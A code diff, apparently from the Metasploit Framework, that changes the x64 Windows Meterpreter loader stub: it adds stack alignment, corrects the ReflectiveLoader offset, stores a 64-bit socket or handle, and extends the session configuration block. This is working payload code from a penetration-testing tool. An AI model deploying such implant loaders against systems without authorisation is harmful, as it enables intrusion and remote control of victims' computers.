@@ -29,7 +29,7 @@ module Payload::Windows::MeterpreterLoader_x64
       ],
       'Platform'      => 'win',
       'Arch'          => ARCH_X64,
-      'PayloadCompat' => { 'Convention' => 'sockrdi' },
+      'PayloadCompat' => { 'Convention' => 'sockrdi handlerdi -https' },
       'Stage'         => { 'Payload'   => "" }
       ))
   end
@@ -42,22 +42,23 @@ module Payload::Windows::MeterpreterLoader_x64
           push rbp              ; save rbp
           mov rbp, rsp          ; set up a new stack frame
           sub rsp, 32           ; allocate some space for calls.
+          and rsp, ~0xF         ; Ensure RSP is 16 byte aligned
         ; GetPC
           call $+5              ; relative call to get location
           pop rbx               ; pop return value
         ; Invoke ReflectiveLoader()
           ; add the offset to ReflectiveLoader()
-          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x11)}
+          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x15)}
           call rbx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
           ; offset from ReflectiveLoader() to the end of the DLL
           add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
     ^
 
-    unless opts[:stageless]
+    unless opts[:stageless] || opts[:force_write_handle] == true
       asm << %Q^
-          ; store the comms socket handle
-          mov dword ptr [rbx], edi
+          ; store the comms socket or handle
+          mov [rbx], rdi
       ^
     end
 
@@ -79,12 +80,14 @@ module Payload::Windows::MeterpreterLoader_x64
 
     # create the configuration block, which for staged connections is really simple.
     config_opts = {
-      arch:       opts[:uuid].arch,
-      exitfunk:   ds['EXITFUNC'],
-      expiration: ds['SessionExpirationTimeout'].to_i,
-      uuid:       opts[:uuid],
-      transports: opts[:transport_config] || [transport_config(opts)],
-      extensions: []
+      arch:              opts[:uuid].arch,
+      null_session_guid: opts[:null_session_guid] == true,
+      exitfunk:          ds[:exit_func] || ds['EXITFUNC'],
+      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
+      uuid:              opts[:uuid],
+      transports:        opts[:transport_config] || [transport_config(opts)],
+      extensions:        [],
+      stageless:         opts[:stageless] == true
     }
 
     # create the configuration instance based off the parameters
